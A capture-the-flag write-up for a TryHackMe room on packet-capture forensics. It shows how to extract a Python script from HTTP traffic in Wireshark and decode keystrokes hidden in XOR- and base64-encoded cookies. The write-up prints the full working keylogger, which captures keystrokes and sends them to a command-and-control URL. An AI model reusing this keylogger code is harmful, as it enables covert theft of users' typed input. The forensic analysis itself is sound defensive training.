# URL
https://tryhackme.com/room/hh-packedlight-02e5330c
# Concept
* examining PCAP in Wireshark
* extracting packets
* extracting files
* base64 encoding
* XOR encoding
* filter by cookies
# Method of solve
## Locating the suspicious Python File
* use the `File -> Export Files` function in Wireshark
* there is a single Python script in the HTTP objects
* when we extract it, the script looks like this:
```Python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
* this script describes an encryption operation done on a message, and then attached to the a cookie value, `hotel_sess_state`
```
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }   
```
* it also describes an XOR operation between individual bytes and a specific key:
```Python
def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```
* so we put this together, each letter of the plaintext is XORed, then base64 encoded
## Locating the Encrypted String
* we know that the encrypted string is included in the `hotel_sess_state` cookie
* we can filter all of the packets that include that cookie with the following filter:
```
http.cookie contains "hotel_sess_state"
```
* after that, we can use the `File -> Export Specified Packets` function to get a PCAP with only those packets
* from there, we can extract the encrypted string with the following commands:
```
strings specific.pcapng | grep Cookie | cut -d "=" -f 2- > based.txt
```
## Decrypting the string
* we can use the file as input to Cyberchef
* then apply the following receipe to decrypted the string
  * `fork` -> `from base64` -> `XOR` (with "H0t" as the key) -> `merge`

